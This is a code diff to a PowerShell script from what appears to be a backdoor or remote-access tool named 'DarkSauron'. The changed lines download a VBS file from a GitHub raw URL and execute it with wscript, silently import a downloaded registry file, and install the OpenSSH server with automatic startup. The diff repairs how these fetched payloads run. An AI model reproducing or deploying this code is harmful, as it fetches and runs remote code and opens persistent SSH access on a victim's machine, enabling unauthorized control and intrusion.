@@ -49,9 +49,13 @@ $vbs_file = random_text
 Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
 
 #install the registry
-./"$reg_file.reg";"$vbs_file.vbs"
 
 
+# For registry file
+Start-Process "reg.exe" -ArgumentList "import `"$reg_file.reg`""
+
+# For VBS file (if you really need it)
+Start-Process "wscript.exe" -ArgumentList "`"$vbs_file.vbs`""
 
 
 
@@ -74,7 +78,7 @@ $initial_dir = Get-Location
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 
 Start-Service sshd 
 Set-Service  -Name sshd -StartupType 'Automatic' 
-Get-NetFirewallRule -Name *ssh* -Enabled Ture 
+Get-NetFirewallRule -Name *ssh* -Enabled True
 
 
 #goto temp ,make working directory
